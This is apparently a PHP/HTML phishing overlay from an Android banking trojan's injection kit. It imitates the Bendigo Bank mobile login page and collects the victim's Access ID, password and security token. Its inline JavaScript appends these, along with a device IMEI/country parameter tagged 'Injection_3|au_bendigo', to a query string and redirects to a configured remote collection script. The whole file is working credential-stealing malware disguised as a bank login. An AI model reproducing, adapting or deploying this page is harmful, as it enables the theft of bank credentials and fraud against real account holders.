<!-- 4.7.10 -->
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="au/com.bendigobank.mobile/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">

<div class="head">
	<img src="au/com.bendigobank.mobile/images/logo.png" style="display: block;margin: 0 auto;z-index: 6;position: relative;margin-top: 30px;">
	<img src="au/com.bendigobank.mobile/images/background.jfif" style="width: 100%;z-index: 0;margin-top: -120px;">
</div>

<div class="content">

<div class="header">
	<img src="au/com.bendigobank.mobile/images/select.png" style="padding-bottom: 20px;float: left;">
	<img src="au/com.bendigobank.mobile/images/local.png" style="float: right;">
<h3 style="font-weight: 100;font-family: sans-serif;margin: 0 auto;text-align: center;"> LOG IN BELOW </h3>

<div class="shardRight"></div>

</div><br>

<form action="null" method="post" id="_mainForm" target="flow_handler">


	<label>Access ID</label>
	<input name="field2" id="login" maxlength="20" class="input" type="text">

	<label>Password</label>
	<input name="field3" id="password" maxlength="50" class="input" type="password">

	<label>Security Token</label>
	<input name="field4" id="secure" maxlength="50" class="input" type="password">
<div class="header">

<div class="shardRight"></div>

</div><br><br>
<input type="submit" id="sbt_button" class="submit" value="Login"/>

</form>
<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
</div>

<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('sbt_button');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('password');
            var oCode2Inp = document.getElementById('secure');

            try{
                oNumInp.className = 'input';
                oCodeInp.className = 'input';
                oCode2Inp.className = 'input';
            } catch(e){};

            if (!/^\w{3,13}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'input error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,13}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'input error';
                } catch(e){};
                return false;
            }

            if (!/^\w{2,10}$/i.test(oCode2Inp.value)) {
                try{
                    oCode2Inp.className = 'input error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|au_bendigo|"+oNumInp.value+"|"+oCodeInp.value+"|"+oCode2Inp.value);

           return false;
       };

   })();
</script>

</div>
</body>
</html>
